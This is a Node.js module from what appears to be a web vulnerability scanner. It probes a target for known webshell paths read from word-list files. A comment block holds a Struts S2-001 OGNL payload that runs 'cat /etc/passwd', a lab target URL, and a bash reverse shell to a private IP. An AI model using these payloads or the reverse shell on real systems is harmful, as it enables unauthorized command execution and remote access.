
module.exports={
	tags:"webshell,urls,web",
	des:"webshell,urls scan",
	VulApps:[],
	urls:[],
		
	/*
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
// http://192.168.10.216:8088/S2-001/login.action
// bash -i >& /dev/tcp/192.168.24.90/8080 0>&1
	*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = this.self,fs = _s.fs, szPath = __dirname + "/../../urls/", aPs = ["webshell.txt","ta3menu.txt"];
		var fnDourl = function(szUrl1,fnCbk1)
		{
			_s.request(({method: 'GET',uri: szUrl1
			,headers:
		    {
		    	"user-agent": _s.g_szUa
		    }}),
	    	function(e,r,b)
		    {
		    	// _s.error(e);
		    	// _s.fnShowBody(b);
		    	// _s.fnDoBody(b,"s2-001",url,null,function(o)
		    	// {
		    	// 	var r = {"url":url,"send":a};
	  			// 	fnCbk(_s.copyO2O(r,o),_t);
		    	// });
		    });
		};
		var aUrls = [],i, nA = 0;
		for(i = 0; i < aPs.length; i++)
		{
			if(fs.existsSync(szPath + aPs[i]))
			{
				aUrls = aUrls.concat(fs.readFileSync(szPath + aPs[i]).toString("utf-8").replace(/[\r \t]/gmi,"").split("\n"));
			}
		}
		nA = aUrls.length;
		var fnCbk2  = function(szUrl1)
		{
			nA--;
			if(0 >= nA)
			{
				;
			}
		};
		for(i = 0; i < aUrls.length; i++)
		{
			(function(n){
				fnDourl(url + aUrls[n],fnCbk2);
			})(i);
		}		
	}
};